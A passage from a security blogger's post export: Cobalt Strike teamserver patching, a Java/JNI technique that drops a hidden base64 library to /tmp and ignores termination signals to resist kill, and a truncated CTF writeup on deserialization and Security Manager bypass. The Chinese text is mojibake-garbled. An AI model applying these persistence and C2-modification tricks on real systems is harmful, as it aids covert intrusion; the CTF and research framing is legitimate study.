å­—æ®µçš„ï¼Œæ‰€ä»¥è¦ç»™å®ƒåŠ ä¸Šã€‚</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal19.jpg" alt="p19"></p><h2 id="0x03-Stage"><a href="#0x03-Stage" class="headerlink" title="0x03 Stage"></a>0x03 Stage</h2><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal11.jpg" alt="p11"></p><p>teamserver æ¥åˆ°åˆ›å»º Listener çš„è¯·æ±‚åï¼Œä¼šå…ˆæŠŠ Listener åºåˆ—åŒ–ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡ teamserver é‡å¯çš„æ—¶å€™å¯ä»¥è‡ªåŠ¨ç›‘å¬ã€‚</p><p>ç„¶åæœ¬åœ°è°ƒç”¨ <code>beacons.start</code> ã€‚è¿™é‡Œçš„è°ƒç”¨é“¾æœ‰ç‚¹é•¿:</p><p>server.Beacons.call() -&gt; server.Beacons.setup() -&gt; beacon.BeaconsSetup.start() -&gt; server.WebCalls.getWebServer() -&gt; beacon.BeaconSetup.exportBeaconStage()</p><p>æœ€ä¸»è¦çš„æ˜¯ä¸¤ä¸ªåœ°æ–¹ <code>server.WebCalls.getWebServer()</code> åˆ›å»º Web æœåŠ¡ï¼Œ<code>beacon.BeaconSetup.exportBeaconStage</code> æ„é€  Stage çš„ shellcodeã€‚</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal14.jpg" alt="p14"></p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal15.jpg" alt="p15"></p><p>è¿™é‡Œçš„ <code>var1</code> æ˜¯ç›‘å¬çš„ç«¯å£å·ï¼Œé»˜è®¤çš„ Stage æŒ‡å‘çš„ç«¯å£å’Œ Listener ç›‘å¬çš„ç«¯å£å·æ˜¯åŒä¸€ä¸ªï¼Œç°åœ¨æˆ‘ä»¬è¦è®©ä»–ä»¬çš„ç«¯å£åˆ†ç¦»ï¼Œå› ä¸º <code>start()</code> å‚æ•°ä¸æ˜¯ <code>Map</code> ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥å¾€é‡ŒåŠ ä¸€ä¸ªå‚æ•°ï¼Œåªèƒ½é‡å†™æˆ–è€…é‡è½½ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ã€‚</p><p>æˆ‘ç›´æ¥é‡å†™äº†ä¸€ä¸‹ï¼ŒåŠ äº†ä¸€ä¸ªå‚æ•° <code>bindPort</code>ï¼Œåˆ›å»º Web æœåŠ¡æ—¶ï¼Œå°±ç”¨è¿™ä¸ªç«¯å£ã€‚Stage è¿˜æ˜¯ç”¨åŸæ¥çš„ <code>var1</code> ä½œä¸ºç«¯å£ï¼Œä¸ç”¨ä¿®æ”¹ã€‚è¿™æ ·åˆ›å»º <code>Listener</code> çš„æ—¶å€™ï¼ŒåŸæ¥ç«¯å£å·ä»£è¡¨ Stage ç”¨çš„</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal16.jpg" alt="p16"></p><p>ç›¸åº”çš„ï¼Œä¸Šå±‚çš„è°ƒç”¨é“¾ä¹Ÿè¦ä¿®æ”¹ä¸€ä¸‹ã€‚</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal17.jpg" alt="p17"></p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal18.jpg" alt="p18"></p><h2 id="0x05-ç¼–è¯‘-amp-æ›¿æ¢"><a href="#0x05-ç¼–è¯‘-amp-æ›¿æ¢" class="headerlink" title="0x05 ç¼–è¯‘ &amp; æ›¿æ¢"></a>0x05 ç¼–è¯‘ &amp; æ›¿æ¢</h2><p>ç„¶åè¦æŠŠä¿®æ”¹è¿‡çš„ä»£ç ç¼–è¯‘ä¸€ä¸‹ï¼Œæ›¿æ¢åˆ° jar é‡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">javac -cp cobaltstrike.jar common/Listener.java</span><br><span class="line">zip -u cobaltstrike.jar common/Listener.class</span><br><span class="line">javac -cp cobaltstrike.jar aggressor/dialogs/ListenerDialog.java </span><br><span class="line">zip -u cobaltstrike.jar aggressor/dialogs/ListenerDialog.class</span><br><span class="line">javac -cp cobaltstrike.jar aggressor/windows/ListenerManager.java </span><br><span class="line">zip -u cobaltstrike.jar aggressor/windows/ListenerManager.class</span><br><span class="line">javac -cp cobaltstrike.jar server/Beacons.java</span><br><span class="line">zip -u cobaltstrike.jar server/Beacons.class</span><br><span class="line">javac -cp cobaltstrike.jar beacon/BeaconSetup.java </span><br><span class="line">zip -u cobaltstrike.jar beacon/BeaconSetup.class</span><br></pre></td></tr></table></figure><p>â¬†ï¸å¯èƒ½æœ‰ç‚¹é—æ¼çš„ï¼Œå„ä½è‡ªå·±è°ƒä¸€ä¸‹å§ã€‚</p><h1 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h1><p><img src="/2020/04/10/pentest-cobaltstrike-improve/rrr.jpg" alt="rrr"></p><h1 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h1><p>è¿™æ˜¯ä¸€ç¯‡19å¹´çš„å­˜ç¨¿ï¼Œå½“æ—¶è¿˜æ²¡æœ‰ <a href="https://www.cobaltstrike.com/help-http-beacon" target="_blank" rel="noopener">CS 4.0</a>ï¼Œè¿™ä¸ªé—®é¢˜ 4.0 å·²ç»è§£å†³äº†ï¼Œå¯ä»¥é…ç½® Listener çš„ <code>C2 Port</code> å’Œ <code>Bind Port</code>ï¼Œå°† C2 çš„ç«¯å£ä¸ teamserver å®é™…ç›‘å¬çš„ç«¯å£åˆ†å¼€ã€‚</p><p>ç°åœ¨æ”¾å‡ºæ¥ï¼Œä¹Ÿç®—æŠ›ç –å¼•ç‰ï¼Œç»™æƒ³è¦ä¿®æ”¹ CS çš„å°ä¼™è®¡æä¾›ç‚¹ç»éªŒï¼Œæ¬¢è¿äº¤æµï½</p>]]></content>
      
      
      
        <tags>
            
            <tag> RedTeam </tag>
            
            <tag> çº¢è“å¯¹æŠ— </tag>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Java å®ç°åå°æ‰§è¡Œ</title>
      <link href="/2020/02/13/java-nohup-implementation/"/>
      <url>/2020/02/13/java-nohup-implementation/</url>
      
        <content type="html"><![CDATA[<p>å¸¸ç”¨çš„å°†ç¨‹åºæ”¾åˆ°åå°æ‰§è¡Œï¼Œå¹¶åœ¨shellé€€å‡ºåä¾ç„¶è¿è¡Œçš„æ–¹æ³•ï¼Œæ˜¯ä½¿ç”¨ <code>nohup</code> ä¸ <code>&amp;</code>ï¼Œæ¯”å¦‚ <code>nohup java -jar abc.jar &amp;</code>ã€‚</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p><code>nohup</code> çš„ä½œç”¨æ˜¯å¿½ç•¥ <code>SIGHUP</code> ä¿¡å·ã€‚å½“ä¸€ä¸ªshellå…³é—­åï¼Œä¼šå‘è¿è¡Œçš„ç¨‹åºå‘é€ <code>SIGHUP</code> ä¿¡å·ï¼Œé€šçŸ¥åŒä¸€shellå†…çš„å„ä¸ªè¿›ç¨‹ï¼Œå®ƒä»¬ä¸æ§åˆ¶ç»ˆç«¯ä¸å†å…³è”ã€‚ç³»ç»Ÿå¯¹ <code>SIGHUP</code> ä¿¡å·çš„é»˜è®¤å¤„ç†æ˜¯ç»ˆæ­¢æ”¶åˆ°è¯¥ä¿¡å·çš„è¿›ç¨‹ã€‚</p><p><code>&amp;</code> çš„ä½œç”¨æ˜¯å¿½ç•¥ <code>SIGINT</code> ä¿¡å·ã€‚<code>Ctrl+C</code> ä¼šå‘å‰å°è¿›ç¨‹å‘é€ <code>SIGINT</code> ä¿¡å·ï¼Œä»¥å…³é—­ç¨‹åºã€‚</p><h1 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h1><p>ç»¼ä¸Šï¼Œåªè¦æˆ‘ä»¬èƒ½å®ç° <code>nohup</code> å’Œ <code>&amp;</code> çš„åŠŸèƒ½ï¼Œå°±èƒ½è®©ç¨‹åºåœ¨åå°è¿è¡Œï¼Œä¸ä¼šå› ä¸º shell æ–­å¼€è€Œä¸­æ–­äº†ã€‚</p><p>ç”±äºé¢˜ç›®æ˜¯ç”¨ Java å®ç°ï¼Œè€Œ Java æœ¬èº«å¹¶ä¸èƒ½è¿›è¡Œå¦‚æ­¤åº•å±‚çš„æ“ä½œï¼Œæ‰€ä»¥æ€è·¯æ˜¯ä½¿ç”¨ JNIï¼Œå€ŸåŠ© C/C++ å®ç°ã€‚</p><p>ç›´æ¥ä¸Šä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> io.github.jayl1n.daemon;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">ignoreSignal</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javah io.github.jayl1n.daemon.Main</code> ç”Ÿæˆå¤´æ–‡ä»¶ï¼Œæ·»åŠ åˆ° C++ é¡¹ç›®é‡Œã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"io_github_jayl1n_daemon_Main.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jboolean JNICALL <span class="title">Java_io_github_jayl1n_daemon_Main_ignoreSignal</span><span class="params">(JNIEnv *, jobject)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//å¿½ç•¥ SIGHUP SIGINT ä¿¡å·ï¼Œé˜²æ­¢ shell æ–­å¼€ ï¼ŒCtrl+C ä¸­æ–­ç¨‹åº</span></span><br><span class="line">    signal(SIGHUP, SIG_IGN);</span><br><span class="line">    signal(SIGINT, SIG_IGN);</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå‡ºæ¥çš„åŠ¨æ€åº“ï¼Œéœ€è¦æ”¾åˆ°ä¸jaråŒ…ç›¸åŒçš„ç›®å½•ä¸‹ï¼Œæˆ–è€…æ˜¯ <code>java.library.path</code> æŒ‡å®šçš„è·¯å¾„ï¼Œå¦åˆ™åœ¨ <code>System.loadLibrary</code> æ—¶æ— æ³•æ‰¾åˆ°åŠ¨æ€åº“ã€‚</p><p><code>java.library.path</code> å˜é‡å¯ä»¥åœ¨æ‰§è¡Œæ—¶æ·»åŠ  <code>-Djava.library.path=/a/b/c</code> å‚æ•°æŒ‡å®šã€‚<code>System.getProperty(&quot;java.library.path&quot;)</code> å¯ä»¥æŸ¥çœ‹å½“å‰çš„è·¯å¾„ã€‚ä½†æ— æ³•é€šè¿‡ <code>System.setProperty(&quot;java.library.path&quot;,&quot;/a/b/c&quot;)</code> ä¿®æ”¹ï¼Œå› ä¸ºåœ¨ JVM å¯åŠ¨æ—¶å°±ä¼šç¼“å­˜è¿™ä¸ªå€¼ï¼Œåç»­ä¿®æ”¹ä¸ä¼šç”Ÿæ•ˆï¼Œå¯ä»¥é€šè¿‡åå°„æ¥æ¸…é™¤ <code>ClassLoader</code> çš„ <code>sys_paths</code> å˜é‡(ç¼“å­˜æ ‡å¿—)ï¼Œé‡æ–°åˆå§‹åŒ– <code>usr_paths</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p>java/lang/ClassLoader.java:1815</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(Class&lt;?&gt; fromClass, String name, <span class="keyword">boolean</span> isAbsolute)</span> </span>&#123;</span><br><span class="line">    ClassLoader loader = (fromClass == <span class="keyword">null</span>) ? <span class="keyword">null</span> : fromClass.getClassLoader();</span><br><span class="line">    <span class="keyword">if</span> (sys_paths == <span class="keyword">null</span>) &#123;</span><br><span class="line">        usr_paths = initializePath(<span class="string">"java.library.path"</span>);</span><br><span class="line">        sys_paths = initializePath(<span class="string">"sun.boot.library.path"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isAbsolute) &#123;</span><br><span class="line">        <span class="keyword">if</span> (loadLibrary0(fromClass, <span class="keyword">new</span> File(name))) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(<span class="string">"Can't load library: "</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰è¡Œï¼Œ<code>sys_paths</code> ä¸ä¸º null æ—¶ï¼Œä¸ä¼šå†åˆå§‹åŒ– <code>java.library.path</code>ï¼Œç›¸å½“äºæ˜¯ç¬¬ä¸€æ¬¡è¯»å–å°±è¢«ç¼“å­˜åˆ°äº† <code>usr_paths</code>ã€‚</p><p>é€šè¿‡åå°„æ¸…é™¤ <code>sys_paths</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//å…ˆä¿®æ”¹ java.library.path</span></span><br><span class="line">    System.setProperty(<span class="string">"java.library.path"</span>, System.getProperty(<span class="string">"java.library.path"</span>) + <span class="string">":/Users/jaylin/daemon-demo/bin"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ¸…é™¤ç¼“å­˜æ ‡å¿—</span></span><br><span class="line">    Field sys_paths = ClassLoader.class.getDeclaredField(<span class="string">"sys_paths"</span>);</span><br><span class="line">    sys_paths.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    sys_paths.set(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//åç»­å† loadLibrary æ—¶ï¼Œå°†ä¼šä½¿ç”¨æ–°çš„ usr_paths</span></span><br></pre></td></tr></table></figure><p>ğŸ‘†ä¸Šé¢è¯´äº†ä¸€ä¸ªå¥‡è¿¹æ·«å·§ï¼Œåœ¨æœ‰å¤šä¸ªåŠ¨æ€åº“ï¼Œç›¸äº’ä¾èµ–æ—¶æ¯”è¾ƒæœ‰ç”¨ã€‚</p><p>è¿™é‡Œå…¶å®ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>System.load</code> ç›´æ¥æŒ‡å®šç»å¯¹è·¯å¾„ï¼ˆæ³¨æ„å’Œ<code>System.loadLibrary</code> çš„åŒºåˆ«ï¼‰ã€‚</p><p>ç”±äºåŠ¨æ€åº“æ— æ³•ç›´æ¥æ‰“åŒ…åˆ° <code>jar</code> åŒ…é‡Œç”¨ï¼Œæ‰€ä»¥ä¸€èˆ¬æ˜¯è¦åˆ†å¼€ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚</p><p>ä¸ºäº†ä¼˜é›…çš„ä½¿ç”¨åŠ¨æ€åº“ï¼Œå¯ä»¥ç¡¬ç¼–ç åˆ° jar åŒ…é‡Œï¼Œåœ¨æ‰§è¡Œæ—¶é‡Šæ”¾å‡ºæ¥ï¼ŒJNI æ”¯æŒå»¶æ—¶åŠ è½½åŠ¨æ€åº“ã€‚</p><p>è¿™é‡Œæˆ‘ä½¿ç”¨ base64 ç¼–ç ï¼Œ <code>cat /Users/jaylin/daemon-demo/bin/libdaemon_jni.dylib | base64</code>ï¼Œä¸‹é¢å†™ä¸ªä¾‹å­ï¼Œå®šæ—¶è¾“å‡ºå­—ç¬¦åˆ° <code>/tmp/test</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    private native boolean ignoreSignal();</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException, Base64DecodingException &#123;</span><br><span class="line">        //é‡Šæ”¾åŠ¨æ€åº“</span><br><span class="line">        String dynlib = &quot;z/rt/+AQAAAOglAAAAvwIAAAC+AQAAAEiJRejoEgAAALEBD7b5SIlF4In4SIPEIF3DkP8lZhAAAAAATI0dZRAAAEFT/yVVAAAAkGgAAAAA6eb///==ï¼ˆçœç•¥ï¼‰&quot;;</span><br><span class="line">        File dynlibFile = new File(&quot;/tmp/.jayl1n&quot;);</span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(dynlibFile);</span><br><span class="line">        fileOutputStream.write(Base64.decode(dynlib));</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        //åŠ è½½åŠ¨æ€åº“</span><br><span class="line">        System.load(&quot;/tmp/.jayl1n&quot;);</span><br><span class="line">        //è°ƒç”¨</span><br><span class="line">        new Main().ignoreSignal();</span><br><span class="line">        AtomicInteger i = new AtomicInteger();</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;echo &quot; + i.getAndIncrement() + &quot; &gt;&gt; /tmp/test&quot;&#125;);</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">            &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><p><img src="/2020/02/13/java-nohup-implementation/xg.gif" alt="æ•ˆæœ"></p><h1 id="è¿›é˜¶-â€”â€”-å…ç–«-kill-å‘½ä»¤"><a href="#è¿›é˜¶-â€”â€”-å…ç–«-kill-å‘½ä»¤" class="headerlink" title="è¿›é˜¶ â€”â€” å…ç–« kill å‘½ä»¤"></a>è¿›é˜¶ â€”â€” å…ç–« kill å‘½ä»¤</h1><p>kill å‘½ä»¤é»˜è®¤æ˜¯å‘é€ <code>SIGTERM</code> ä¿¡å·ï¼Œå‹å¥½åœ°é€šçŸ¥è¿›ç¨‹è¯¥ç»“æŸäº†ã€‚è¿›ç¨‹åœ¨è¿™ç§æƒ…å†µä¸‹å¯ä»¥ä¸å“åº” <code>SIGTERM</code>ï¼ˆå³å¿½ç•¥ï¼‰ï¼Œç»§ç»­æ‰§è¡Œä¸‹å»ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´åªè¦å† <code>signal(SIGTERM, SIG_IGN);</code> å°±å¯ä»¥é˜²æ­¢è¢« kill æ€æ‰äº†ï¼Œç»è¿‡æµ‹è¯•ç¡®å®å¯ä»¥å®ç°ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±è¯•ä¸€ä¸‹ã€‚</p><p>ä¸è¿‡ï¼Œå½“ kill å‘½ä»¤å¸¦å‚æ•°æ—¶ï¼ˆkill -9ï¼‰ï¼Œå‘é€çš„æ˜¯ <code>SIGKILL</code> ä¿¡å·ï¼Œè¿™ä¸ªä¿¡å·æ— æ³•è¢«æ•è·æˆ–å¿½ç•¥ï¼ŒCTF é‡Œæœ‰å¸¸ç”¨çš„æ€ä¸æ­»é©¬çš„æ–¹æ³• <code>kill -9 -1</code>(æ€æ­»é™¤initè¿›ç¨‹å¤–çš„æ‰€æœ‰è¿›ç¨‹)ï¼Œæ­¤æ—¶ï¼Œç¨‹åºæ— æ³•æ„ŸçŸ¥åˆ° <code>SIGKILL</code> ä¿¡å·ï¼Œå°±è¢«ç³»ç»Ÿå¹²æ‰äº†ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://people.cs.pitt.edu/~alanjawi/cs449/code/shell/UnixSignals.htm" target="_blank" rel="noopener">Unix Signals</a></p><p><a href="https://my.oschina.net/LinBigR/blog/799561" target="_blank" rel="noopener">Nohupæºç åˆ†æ</a></p><p><a href="https://blog.csdn.net/z50L2O08e2u4afToR9A/article/details/80047865" target="_blank" rel="noopener">ä¸€åˆ†é’Ÿäº†è§£nohupå’Œ&amp;çš„åŠŸæ•ˆ</a></p><p><a href="https://blog.csdn.net/weixin_39540568/article/details/87985417" target="_blank" rel="noopener">killå‘½ä»¤â€”â€”ç³»ç»Ÿå†…éƒ¨æ‰§è¡Œæµç¨‹</a></p><p><a href="https://blog.csdn.net/madpointer/article/details/13091705" target="_blank" rel="noopener">ä¸å¯å¿½ç•¥æˆ–æ•æ‰çš„ä¿¡å·â€”SIGSTOPå’ŒSIGKILL</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2020 å¤§å®¶æ–°å¹´å¿«ä¹é¸­</title>
      <link href="/2020/01/04/happy-new-year-2020/"/>
      <url>/2020/01/04/happy-new-year-2020/</url>
      
        <content type="html"><![CDATA[<p>è·ç¦»ä¸Šæ¬¡å†™åšå®¢å·²ç»éš”äº†å¤§åŠå¹´ï¼Œç”±äºä¸­é—´æ¢äº†MacBookï¼Œåˆæ€¥æ€¥å¿™å¿™çš„èµ¶å»å®ä¹ ï¼ŒåŸæ¥åšå®¢çš„æºç ä¸€ç›´æ²¡æ—¶é—´è¿ç§»è¿‡æ¥ï¼ˆå°±æ˜¯æ‡’ï¼‰ï¼Œæ‰€ä»¥å¾ˆä¹…éƒ½æ²¡æœ‰å‘æ–‡äº†ã€‚</p><p>ç›®å‰æˆ‘åœ¨æŸç¾è‚¡ä¸Šå¸‚å…¬å¸åšçº¢è“å¯¹æŠ—ï¼Œå®ä¹ äº†è¿™ä¹ˆä¹…ï¼Œæ”¶è·äº†æŒºå¤šï¼Œæ‰“ç®—æœ‰æ—¶é—´äº†å†™å‡ºæ¥ã€‚</p><p>æ•¬è¯·å…³æ³¨ï¼Œç¥å¤§å®¶æ–°å¹´å¿«ä¹ï½ ï¼ˆæ‰‹åŠ¨é¾‡ç‰™</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>SCTF2019 babyEoP Writeup</title>
      <link href="/2019/06/26/sctf-2019-babyEoP-Writeup/"/>
      <url>/2019/06/26/sctf-2019-babyEoP-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p> ç¬¬ä¸€æ¬¡ç»™æ¯”è¾ƒæ­£å¼çš„æ¯”èµ›å‡ºé¢˜ :) ï¼ŒèŠ±äº†æŒºé•¿æ—¶é—´å‡†å¤‡çš„ã€‚ä¹‹å‰è¿˜ä¸€ç›´æ‹…å¿ƒé¢˜ç›®å¤ªç®€å•è¢«ç¥ä»™ä»¬ç§’äº†ï¼Œçœ‹ç»“æœè¿˜æ˜¯é˜”ä»¥çš„â€”â€”0è§£ï¼Œä¹Ÿæœ‰äº›é—æ†¾ï¼Œæ²¡èƒ½è®© Part 2 å‡ºæ¥ã€‚</p><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªwebshellï¼Œå¼±å£ä»¤ 123456 ç›´æ¥è¿›å»ã€‚</p><p>Tomcatå¯ç”¨äº†<em>Java Security Manager</em>ï¼ŒwebshellåŸºæœ¬æ‰€æœ‰åŠŸèƒ½æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œä½†æ˜¯å¯ä»¥æŸ¥çœ‹æœ‰é™çš„å‡ ä¸ªç›®å½•æ–‡ä»¶ï¼Œæ— å†™æƒé™ã€‚</p><p>å¦‚æœé¡ºåˆ©ï¼Œåº”è¯¥å¯ä»¥æ”¶é›†åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ol><li><p>cookieå¤„å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œæœ‰ååºåˆ—åŒ–æ¼æ´ã€‚</p></li><li><p>æŸ¥çœ‹libç›®å½•ï¼Œå­˜åœ¨ commons-collections 3.1 gadgetã€‚</p></li><li><p>æ‰¾åˆ° <code>catalina.policy</code> æ–‡ä»¶ï¼Œæ˜¯Tomcaté»˜è®¤çš„å®‰å…¨ç­–ç•¥é…ç½®æ–‡ä»¶ï¼Œè¿™åº”è¯¥æ˜¯æœ¬é¢˜å¯èƒ½æœ‰ç‚¹è„‘æ´çš„åœ°æ–¹ï¼Œå› ä¸ºæ²¡æœ‰ç»™ <code>C:/babyEoP/apache-tomcat-8.5.42</code> çš„è¯»æƒé™ï¼Œæ‰€ä»¥æ— æ³•åˆ—ç›®å½•ï¼Œä½†æ˜¯ <code>conf</code> ç›®å½•æ˜¯å¯è¯»çš„ã€‚ï¼ˆæœ‰å°†è¿‘10ä½é€‰æ‰‹è¯»åˆ°äº†è¿™ä¸ªæ–‡ä»¶hhhhã€‚ï¼‰</p><p>æˆ‘åœ¨å®˜æ–¹æä¾›çš„ <code>catalina.policy</code> çš„åŸºç¡€ä¸Šï¼Œåšäº†ä¸€äº›ä¿®æ”¹ã€‚ç»™äº† <em>LoadLibrary</em> ã€ <em>createClassLoader</em>ã€ <em>accessDeclaredMembers</em> å‡ ä¸ªé‡è¦æƒé™ã€‚</p></li></ol><p>åˆ†æ policy ï¼Œåº”è¯¥å¾ˆå®¹æ˜“å¯ä»¥æƒ³åˆ°ï¼Œè¦é€šè¿‡ JNI ç»•è¿‡ <em>Java Security Manager</em>ã€‚ä½†æ˜¯ JNI éœ€è¦åŠ è½½ä¸€ä¸ª dll åŠ¨æ€é“¾æ¥åº“ï¼Œç”±äºå¹¶æ²¡æœ‰ç»™ä»»ä½•å†™æƒé™ï¼Œæ‰€ä»¥æ˜¯ä¸å¯èƒ½ä¸Šä¼  dll çš„ã€‚</p><p>å¹¶ä¸”ï¼Œwebshell çš„ <code>Eval Java Code</code> ä½¿ç”¨æ—¶ï¼Œéœ€è¦å‘å½“å‰ç›®å½•å†™ä¸€ä¸ª <code>tmp.jsp</code> æ–‡ä»¶ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ä¸èƒ½ç”¨çš„ï¼ˆä¸è¦æƒ³ç€ç”¨è¿™ä¸ªæ‰§è¡Œä»£ç ï¼‰ã€‚</p><p>é‚£ä¹ˆè¯¥å¦‚ä½•æ‰èƒ½æ‰§è¡Œä»£ç æ¥åŠ è½½ä¸€ä¸ªä¸åœ¨æœ¬åœ°çš„dllå‘¢ï¼Ÿ</p><p>ä¸‹é¢æ˜¯å…·ä½“çš„è§£é¢˜æ€è·¯ï¼š</p><p>é¢˜ç›®å·²ç»ç»™äº†ååºåˆ—åŒ–çš„ç‚¹ä»¥åŠgadgetï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥æ‰§è¡Œä»£ç ã€‚</p><blockquote><p>ysoserial çš„ commons-collections åˆ©ç”¨é“¾æä¾›äº†å‡ ä¸ªç›´æ¥æ‰§è¡Œå‘½ä»¤çš„ gadgetï¼Œä½†æ˜¯éƒ½æ˜¯åŸºäº Runtime.exec çš„ï¼Œå¹¶æ²¡æœ‰ç»™è¿™ä¸ªæƒé™ã€‚So æƒ³è¦ç›´æ¥åˆ©ç”¨æ˜¯ä¸è¡Œçš„ã€‚</p></blockquote><p>ä½†æ˜¯ç›´æ¥ç”¨ gadget æ„é€ å‡ºåŠ 